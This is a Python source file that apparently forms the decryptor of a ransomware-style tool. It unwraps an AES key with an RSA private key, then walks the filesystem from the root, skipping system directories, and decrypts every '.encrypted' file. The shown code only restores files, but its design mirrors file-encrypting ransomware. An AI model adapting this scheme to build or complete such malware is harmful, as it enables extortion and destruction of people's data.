import os
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend
from Variables import system_dirs

####################################################################################################################

def load_rsa_private_key():
    with open("private.pem", "rb") as f:
        private_key = serialization.load_pem_private_key(f.read(), password=None)
    return private_key

def load_encrypted_aes_key():
    with open("key.encrypted", "rb") as f:
        return f.read()

def decrypt_aes_key_with_rsa(encrypted_key, private_key):
    symmetric_key = private_key.decrypt(
        encrypted_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    return symmetric_key

def decrypt_file_with_aes(file_path, key):
    backend = default_backend()

    with open(file_path, "rb") as f:
        iv = f.read(16)
        encrypted_data = f.read()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    decryptor = cipher.decryptor()

    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

    unpadder = sym_padding.PKCS7(128).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()

    with open(file_path, "wb") as f:
        f.write(data)

####################################################################################################################

def decrypt_user_files(root_path, aes_key):
    script_dir = os.path.dirname(os.path.abspath(__file__))  # Get the scripts directory

    for root, dirs, files in os.walk(root_path):
        if any(root.startswith(system_dir) for system_dir in system_dirs) or root.startswith(script_dir):
            continue  # Skip system dirs and the script directory since they wont be encrypted

        for file in files:
            if not file.endswith(".encrypted"):  # Only decrypt .encrypted files
                continue

            file_path = os.path.join(root, file)

            try:
                decrypt_file_with_aes(file_path, aes_key)
                os.rename(file_path, file_path.replace(".encrypted", ""))
            except Exception:
                continue

def decrypt_all_files():
    private_key = load_rsa_private_key()
    encrypted_aes_key = load_encrypted_aes_key()
    aes_key = decrypt_aes_key_with_rsa(encrypted_aes_key, private_key)

    decrypt_user_files("/", aes_key)

####################################################################################################################